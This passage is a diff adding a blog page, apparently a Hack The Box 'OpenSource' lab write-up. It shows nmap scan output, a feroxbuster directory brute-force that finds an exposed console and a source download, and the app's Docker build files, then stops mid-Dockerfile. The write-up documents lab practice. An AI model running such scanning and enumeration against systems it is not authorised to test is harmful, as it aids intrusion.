@@ -1,0 +1,358 @@
+<!doctype html><html lang=mn dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>HTB - OpenSource | CaDiL's Blog</title>
+<meta name=keywords content="Writeup"><meta name=description content="HTB - OpenSource - Writeup /Mostly Notes/"><meta name=author content="CaDiL"><link rel=canonical href=https://cadil.github.io/posts/2024-03-13-htb-opensource-writeup/><link crossorigin=anonymous href=/assets/css/stylesheet.b609c58d5c11bb90b1a54e04005d74ad1ddf22165eb79f5533967e57df9c3b50.css integrity="sha256-tgnFjVwRu5CxpU4EAF10rR3fIhZet59VM5Z+V9+cO1A=" rel="preload stylesheet" as=style><link rel=icon href=https://cadil.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://cadil.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://cadil.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://cadil.github.io/apple-touch-icon.png><link rel=mask-icon href=https://cadil.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=mn href=https://cadil.github.io/posts/2024-03-13-htb-opensource-writeup/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script>var doNotTrack=!1;doNotTrack||(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-195170229-1","auto"),ga("send","pageview"))</script><meta property="og:title" content="HTB - OpenSource"><meta property="og:description" content="HTB - OpenSource - Writeup /Mostly Notes/"><meta property="og:type" content="article"><meta property="og:url" content="https://cadil.github.io/posts/2024-03-13-htb-opensource-writeup/"><meta property="og:image" content="https://cadil.github.io/static"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-03-13T00:00:00+00:00"><meta property="article:modified_time" content="2024-03-13T00:00:00+00:00"><meta property="og:site_name" content="CaDiL's Blog"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://cadil.github.io/static"><meta name=twitter:title content="HTB - OpenSource"><meta name=twitter:description content="HTB - OpenSource - Writeup /Mostly Notes/"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://cadil.github.io/posts/"},{"@type":"ListItem","position":2,"name":"HTB - OpenSource","item":"https://cadil.github.io/posts/2024-03-13-htb-opensource-writeup/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HTB - OpenSource","name":"HTB - OpenSource","description":"HTB - OpenSource - Writeup /Mostly Notes/","keywords":["Writeup"],"articleBody":"1. IP Address # Machine Address 10.10.11.164 # Local Address 10.10.14.54 2. Nmap nmap -sV -sC -oA nmap/retired 10.10.11.164 # Nmap 7.92 scan initiated Thu Jul 14 00:20:33 2022 as: nmap -sV -sC -oA nmap/opensource 10.10.11.164 Nmap scan report for 10.10.11.164 Host is up (0.23s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f (RSA) | 256 48:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 (ECDSA) |_ 256 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 (ED25519) 80/tcp open http Werkzeug/2.1.2 Python/3.10.3 |_http-server-header: Werkzeug/2.1.2 Python/3.10.3 |_http-title: upcloud - Upload files for Free! | fingerprint-strings: | GetRequest: | HTTP/1.1 200 OK | Server: Werkzeug/2.1.2 Python/3.10.3 | Date: Thu, 14 Jul 2022 04:21:03 GMT | Content-Type: text/html; charset=utf-8 | Content-Length: 5316 | Connection: close | ","wordCount":"1184","inLanguage":"mn","datePublished":"2024-03-13T00:00:00Z","dateModified":"2024-03-13T00:00:00Z","author":{"@type":"Person","name":"CaDiL"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://cadil.github.io/posts/2024-03-13-htb-opensource-writeup/"},"publisher":{"@type":"Organization","name":"CaDiL's Blog","logo":{"@type":"ImageObject","url":"https://cadil.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://cadil.github.io/ accesskey=h title="CaDiL's Blog (Alt + H)">CaDiL's Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://cadil.github.io/archives/ title=Архив><span>Архив</span></a></li><li><a href=https://cadil.github.io/search/ title=Хайлт><span>Хайлт</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://cadil.github.io/>Нүүр</a>&nbsp;»&nbsp;<a href=https://cadil.github.io/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">HTB - OpenSource</h1><div class=post-description>HTB - OpenSource - Writeup /Mostly Notes/</div><div class=post-meta><span title='2024-03-13 00:00:00 +0000 UTC'>гуравдугаар сар 13, 2024</span>&nbsp;·&nbsp;6 МИН&nbsp;·&nbsp;CaDiL</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Агуулга</span></summary><div class=inner><ul><li><a href=#1-ip-address aria-label="1. IP Address">1. IP Address</a></li><li><a href=#2-nmap aria-label="2. Nmap">2. Nmap</a></li><li><a href=#3-feroxbuster aria-label="3. Feroxbuster">3. Feroxbuster</a></li><li><a href=#4-sourcezip aria-label="4. Source.zip">4. Source.zip</a></li><li><a href=#5-git-extract aria-label="5.  .git Extract">5.  .git Extract</a></li><li><a href=#6-burp aria-label="6. Burp">6. Burp</a></li><li><a href=#7-chisel aria-label="7. Chisel">7. Chisel</a></li><li><a href=#8-privilege-escalation aria-label="8. Privilege escalation">8. Privilege escalation</a></li></ul></div></details></div><div class=post-content><h3 id=1-ip-address>1. IP Address<a hidden class=anchor aria-hidden=true href=#1-ip-address>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Machine Address</span>
+</span></span><span style=display:flex><span>10.10.11.164
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Local Address</span>
+</span></span><span style=display:flex><span>10.10.14.54
+</span></span></code></pre></div><h3 id=2-nmap>2. Nmap<a hidden class=anchor aria-hidden=true href=#2-nmap>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>nmap -sV -sC -oA nmap/retired 10.10.11.164
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Nmap 7.92 scan initiated Thu Jul 14 00:20:33 2022 as: nmap -sV -sC -oA nmap/opensource 10.10.11.164</span>
+</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.10.11.164
+</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.23s latency<span style=color:#f92672>)</span>.
+</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>997</span> closed tcp ports <span style=color:#f92672>(</span>conn-refused<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>PORT     STATE    SERVICE VERSION
+</span></span><span style=display:flex><span>22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 <span style=color:#f92672>(</span>Ubuntu Linux; protocol 2.0<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>| ssh-hostkey: 
+</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>2048</span> 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f <span style=color:#f92672>(</span>RSA<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>256</span> 48:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>|_  <span style=color:#ae81ff>256</span> 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 <span style=color:#f92672>(</span>ED25519<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>80/tcp   open     http    Werkzeug/2.1.2 Python/3.10.3
+</span></span><span style=display:flex><span>|_http-server-header: Werkzeug/2.1.2 Python/3.10.3
+</span></span><span style=display:flex><span>|_http-title: upcloud - Upload files <span style=color:#66d9ef>for</span> Free!
+</span></span><span style=display:flex><span>| fingerprint-strings: 
+</span></span><span style=display:flex><span>|   GetRequest: 
+</span></span><span style=display:flex><span>|     HTTP/1.1 <span style=color:#ae81ff>200</span> OK
+</span></span><span style=display:flex><span>|     Server: Werkzeug/2.1.2 Python/3.10.3
+</span></span><span style=display:flex><span>|     Date: Thu, <span style=color:#ae81ff>14</span> Jul <span style=color:#ae81ff>2022</span> 04:21:03 GMT
+</span></span><span style=display:flex><span>|     Content-Type: text/html; charset<span style=color:#f92672>=</span>utf-8
+</span></span><span style=display:flex><span>|     Content-Length: <span style=color:#ae81ff>5316</span>
+</span></span><span style=display:flex><span>|     Connection: close
+</span></span><span style=display:flex><span>|     &lt;html lang<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;en&#34;</span>&gt;
+</span></span><span style=display:flex><span>|     &lt;head&gt;
+</span></span><span style=display:flex><span>|     &lt;meta charset<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;UTF-8&#34;</span>&gt;
+</span></span><span style=display:flex><span>|     &lt;meta name<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;viewport&#34;</span> content<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;width=device-width, initial-scale=1.0&#34;</span>&gt;
+</span></span><span style=display:flex><span>|     &lt;title&gt;upcloud - Upload files <span style=color:#66d9ef>for</span> Free!&lt;/title&gt;
+</span></span><span style=display:flex><span>|     &lt;script src<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;/static/vendor/jquery/jquery-3.4.1.min.js&#34;</span>&gt;&lt;/script&gt;
+</span></span><span style=display:flex><span>|     &lt;script src<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;/static/vendor/popper/popper.min.js&#34;</span>&gt;&lt;/script&gt;
+</span></span><span style=display:flex><span>|     &lt;script src<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;/static/vendor/bootstrap/js/bootstrap.min.js&#34;</span>&gt;&lt;/script&gt;
+</span></span><span style=display:flex><span>|     &lt;script src<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;/static/js/ie10-viewport-bug-workaround.js&#34;</span>&gt;&lt;/script&gt;
+</span></span><span style=display:flex><span>|     &lt;link rel<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;stylesheet&#34;</span> href<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;/static/vendor/bootstrap/css/bootstrap.css&#34;</span>/&gt;
+</span></span><span style=display:flex><span>|     &lt;link rel<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;stylesheet&#34;</span> href<span style=color:#f92672>=</span><span style=color:#e6db74>&#34; /static/vendor/bootstrap/css/bootstrap-grid.css&#34;</span>/&gt;
+</span></span><span style=display:flex><span>|     &lt;link rel<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;stylesheet&#34;</span> href<span style=color:#f92672>=</span><span style=color:#e6db74>&#34; /static/vendor/bootstrap/css/bootstrap-reboot.css&#34;</span>/&gt;
+</span></span><span style=display:flex><span>|     &lt;link rel<span style=color:#f92672>=</span>
+</span></span><span style=display:flex><span>|   HTTPOptions: 
+</span></span><span style=display:flex><span>|     HTTP/1.1 <span style=color:#ae81ff>200</span> OK
+</span></span><span style=display:flex><span>|     Server: Werkzeug/2.1.2 Python/3.10.3
+</span></span><span style=display:flex><span>|     Date: Thu, <span style=color:#ae81ff>14</span> Jul <span style=color:#ae81ff>2022</span> 04:21:03 GMT
+</span></span><span style=display:flex><span>|     Content-Type: text/html; charset<span style=color:#f92672>=</span>utf-8
+</span></span><span style=display:flex><span>|     Allow: HEAD, OPTIONS, GET
+</span></span><span style=display:flex><span>|     Content-Length: <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>|     Connection: close
+</span></span><span style=display:flex><span>|   RTSPRequest: 
+</span></span><span style=display:flex><span>|     &lt;!DOCTYPE HTML PUBLIC <span style=color:#e6db74>&#34;-//W3C//DTD HTML 4.01//EN&#34;</span>
+</span></span><span style=display:flex><span>|     <span style=color:#e6db74>&#34;http://www.w3.org/TR/html4/strict.dtd&#34;</span>&gt;
+</span></span><span style=display:flex><span>|     &lt;html&gt;
+</span></span><span style=display:flex><span>|     &lt;head&gt;
+</span></span><span style=display:flex><span>|     &lt;meta http-equiv<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;Content-Type&#34;</span> content<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;text/html;charset=utf-8&#34;</span>&gt;
+</span></span><span style=display:flex><span>|     &lt;title&gt;Error response&lt;/title&gt;
+</span></span><span style=display:flex><span>|     &lt;/head&gt;
+</span></span><span style=display:flex><span>|     &lt;body&gt;
+</span></span><span style=display:flex><span>|     &lt;h1&gt;Error response&lt;/h1&gt;
+</span></span><span style=display:flex><span>|     &lt;p&gt;Error code: 400&lt;/p&gt;
+</span></span><span style=display:flex><span>|     &lt;p&gt;Message: Bad request version <span style=color:#f92672>(</span><span style=color:#e6db74>&#39;RTSP/1.0&#39;</span><span style=color:#f92672>)</span>.&lt;/p&gt;
+</span></span><span style=display:flex><span>|     &lt;p&gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&lt;/p&gt;
+</span></span><span style=display:flex><span>|     &lt;/body&gt;
+</span></span><span style=display:flex><span>|_    &lt;/html&gt;
+</span></span><span style=display:flex><span>3000/tcp filtered ppp
+</span></span><span style=display:flex><span><span style=color:#ae81ff>1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span><span style=display:flex><span>SF-Port80-TCP:V<span style=color:#f92672>=</span>7.92%I<span style=color:#f92672>=</span>7%D<span style=color:#f92672>=</span>7/14%Time<span style=color:#f92672>=</span>62CF99AD%P<span style=color:#f92672>=</span>x86_64-pc-linux-gnu%r<span style=color:#f92672>(</span>GetR
+</span></span><span style=display:flex><span>SF:equest,1573,<span style=color:#e6db74>&#34;HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.1\.2\x20P
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:ython/3\.10\.3\r\nDate:\x20Thu,\x2014\x20Jul\x202022\x2004:21:03\x20GMT
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:5316\r\nConnection:\x20close\r\n\r\n&lt;html\x20lang=\&#34;en\&#34;&gt;\n&lt;head&gt;\n\x20
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:\x20\x20\x20&lt;meta\x20charset=\&#34;UTF-8\&#34;&gt;\n\x20\x20\x20\x20&lt;meta\x20name=
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:\&#34;viewport\&#34;\x20content=\&#34;width=device-width,\x20initial-scale=1\.0\&#34;&gt;\
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:n\x20\x20\x20\x20&lt;title&gt;upcloud\x20-\x20Upload\x20files\x20for\x20Free!
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:&lt;/title&gt;\n\n\x20\x20\x20\x20&lt;script\x20src=\&#34;/static/vendor/jquery/jque
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:ry-3\.4\.1\.min\.js\&#34;&gt;&lt;/script&gt;\n\x20\x20\x20\x20&lt;script\x20src=\&#34;/stat
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:ic/vendor/popper/popper\.min\.js\&#34;&gt;&lt;/script&gt;\n\n\x20\x20\x20\x20&lt;script
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:\x20src=\&#34;/static/vendor/bootstrap/js/bootstrap\.min\.js\&#34;&gt;&lt;/script&gt;\n\
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:x20\x20\x20\x20&lt;script\x20src=\&#34;/static/js/ie10-viewport-bug-workaround
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:\.js\&#34;&gt;&lt;/script&gt;\n\n\x20\x20\x20\x20&lt;link\x20rel=\&#34;stylesheet\&#34;\x20href
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:=\&#34;/static/vendor/bootstrap/css/bootstrap\.css\&#34;/&gt;\n\x20\x20\x20\x20&lt;li
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:nk\x20rel=\&#34;stylesheet\&#34;\x20href=\&#34;\x20/static/vendor/bootstrap/css/boo
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:tstrap-grid\.css\&#34;/&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&#34;stylesheet\&#34;\x20hr
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:ef=\&#34;\x20/static/vendor/bootstrap/css/bootstrap-reboot\.css\&#34;/&gt;\n\n\x20
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:\x20\x20\x20&lt;link\x20rel=&#34;</span><span style=color:#f92672>)</span>%r<span style=color:#f92672>(</span>HTTPOptions,C7,<span style=color:#e6db74>&#34;HTTP/1\.1\x20200\x20OK\r\
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:nServer:\x20Werkzeug/2\.1\.2\x20Python/3\.10\.3\r\nDate:\x20Thu,\x2014\
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:x20Jul\x202022\x2004:21:03\x20GMT\r\nContent-Type:\x20text/html;\x20cha
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:rset=utf-8\r\nAllow:\x20HEAD,\x20OPTIONS,\x20GET\r\nContent-Length:\x20
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:0\r\nConnection:\x20close\r\n\r\n&#34;</span><span style=color:#f92672>)</span>%r<span style=color:#f92672>(</span>RTSPRequest,1F4,<span style=color:#e6db74>&#34;&lt;!DOCTYPE\x20HTM
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:L\x20PUBLIC\x20\&#34;-//W3C//DTD\x20HTML\x204\.01//EN\&#34;\n\x20\x20\x20\x20\x
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:20\x20\x20\x20\&#34;http://www\.w3\.org/TR/html4/strict\.dtd\&#34;&gt;\n&lt;html&gt;\n\x
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:20\x20\x20\x20&lt;head&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;meta\x20http-equ
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:iv=\&#34;Content-Type\&#34;\x20content=\&#34;text/html;charset=utf-8\&#34;&gt;\n\x20\x20\x
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:20\x20\x20\x20\x20\x20&lt;title&gt;Error\x20response&lt;/title&gt;\n\x20\x20\x20\x2
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:0&lt;/head&gt;\n\x20\x20\x20\x20&lt;body&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;h1&gt;E
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:rror\x20response&lt;/h1&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Error\x20code
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF::\x20400&lt;/p&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Message:\x20Bad\x20req
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:uest\x20version\x20\(&#39;RTSP/1\.0&#39;\)\.&lt;/p&gt;\n\x20\x20\x20\x20\x20\x20\x20\
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:x20&lt;p&gt;Error\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST\x20-\x20
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:Bad\x20request\x20syntax\x20or\x20unsupported\x20method\.&lt;/p&gt;\n\x20\x20
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:\x20\x20&lt;/body&gt;\n&lt;/html&gt;\n&#34;</span><span style=color:#f92672>)</span>;
+</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style=display:flex><span><span style=color:#75715e># Nmap done at Thu Jul 14 00:22:38 2022 -- 1 IP address (1 host up) scanned in 124.93 seconds</span>
+</span></span></code></pre></div><h3 id=3-feroxbuster>3. Feroxbuster<a hidden class=anchor aria-hidden=true href=#3-feroxbuster>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>feroxbuster -u http://10.10.11.164 -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>─────────────────────────────────────────────────────────────────────────                                                                                          
+</span></span><span style=display:flex><span>Enter a comma-separated list of indexes/ranges to cancel <span style=color:#f92672>(</span>ex: 1-4,8,9-13<span style=color:#f92672>)</span>                                                                                          
+</span></span><span style=display:flex><span>                Add -f to skip confirmation <span style=color:#f92672>(</span>ex: 3-5 -f<span style=color:#f92672>)</span>                                                                                                           
+</span></span><span style=display:flex><span>─────────────────────────────────────────────────────────────────────────                                                                                          
+</span></span><span style=display:flex><span><span style=color:#ae81ff>200</span>     9803l    56722w  2489147c http://10.10.11.164/download                                                                                                     
+</span></span><span style=display:flex><span><span style=color:#ae81ff>200</span>       45l      144w     1563c http://10.10.11.164/console
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span><span style=color:#75715e>################&gt;---] - 3m     24036/29999   57s     found:2       errors:0       </span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span><span style=color:#75715e>################&gt;---] - 3m     24034/29999   105/s   http://10.10.11.164</span>
+</span></span></code></pre></div><p>http://10.10.11.164/console</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-txt data-lang=txt><span style=display:flex><span>Console Locked
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>The console is locked and needs to be unlocked by entering the PIN. You can find the PIN printed out on the standard output of your shell that runs the server. 
+</span></span></code></pre></div><p>http://10.10.11.164/download
+source.zip extract хийгээд харвал:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>└╼va4mi$ls -lha
+</span></span><span style=display:flex><span>total 2.4M
+</span></span><span style=display:flex><span>drwxr-xr-x <span style=color:#ae81ff>1</span> va4mi va4mi   <span style=color:#ae81ff>96</span> Jul <span style=color:#ae81ff>14</span> 00:23 .
+</span></span><span style=display:flex><span>drwxr-xr-x <span style=color:#ae81ff>1</span> va4mi va4mi   <span style=color:#ae81ff>12</span> Jul <span style=color:#ae81ff>14</span> 00:22 ..
+</span></span><span style=display:flex><span>drwxrwxr-x <span style=color:#ae81ff>1</span> va4mi va4mi   <span style=color:#ae81ff>64</span> Apr <span style=color:#ae81ff>28</span> 07:45 app
+</span></span><span style=display:flex><span>-rwxr-xr-x <span style=color:#ae81ff>1</span> va4mi va4mi  <span style=color:#ae81ff>110</span> Apr <span style=color:#ae81ff>28</span> 07:40 build-docker.sh
+</span></span><span style=display:flex><span>drwxr-xr-x <span style=color:#ae81ff>1</span> va4mi va4mi   <span style=color:#ae81ff>32</span> Apr <span style=color:#ae81ff>28</span> 07:34 config
+</span></span><span style=display:flex><span>-rw-rw-r-- <span style=color:#ae81ff>1</span> va4mi va4mi  <span style=color:#ae81ff>574</span> Apr <span style=color:#ae81ff>28</span> 08:50 Dockerfile
+</span></span><span style=display:flex><span>drwxrwxr-x <span style=color:#ae81ff>1</span> va4mi va4mi  <span style=color:#ae81ff>144</span> Apr <span style=color:#ae81ff>28</span> 08:50 .git
+</span></span></code></pre></div><p>build-docker.sh</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e>#!/bin/bash
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>docker rm -f upcloud
+</span></span><span style=display:flex><span>docker build --tag<span style=color:#f92672>=</span>upcloud .
+</span></span><span style=display:flex><span>docker run -p 80:80 --rm --name<span style=color:#f92672>=</span>upcloud upcloud
+</span></span></code></pre></div><p>Dockerfile</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>FROM python:3-alpine
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Install packages</span>
+</span></span><span style=display:flex><span>RUN apk add --update --no-cache supervisor
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Upgrade pip</span>
+</span></span><span style=display:flex><span>RUN python -m pip install --upgrade pip
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Install dependencies</span>
+</span></span><span style=display:flex><span>RUN pip install Flask
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Setup app</span>
+</span></span><span style=display:flex><span>RUN mkdir -p /app
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Switch working environment</span>
+</span></span><span style=display:flex><span>WORKDIR /app
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Add application</span>
+</span></span><span style=display:flex><span>COPY app .
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Setup supervisor</span>
+</span></span><span style=display:flex><span>COPY config/supervisord.conf /etc/supervisord.conf
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Expose port the server is reachable on</span>
+</span></span><span style=display:flex><span>EXPOSE <span style=color:#ae81ff>80</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Disable pycache</span>
+</span></span><span style=display:flex><span>ENV PYTHONDONTWRITEBYTECODE<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Set mode</span>
+</span></span><span style=display:flex><span>ENV MODE<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;PRODUCTION&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Run supervisord</span>
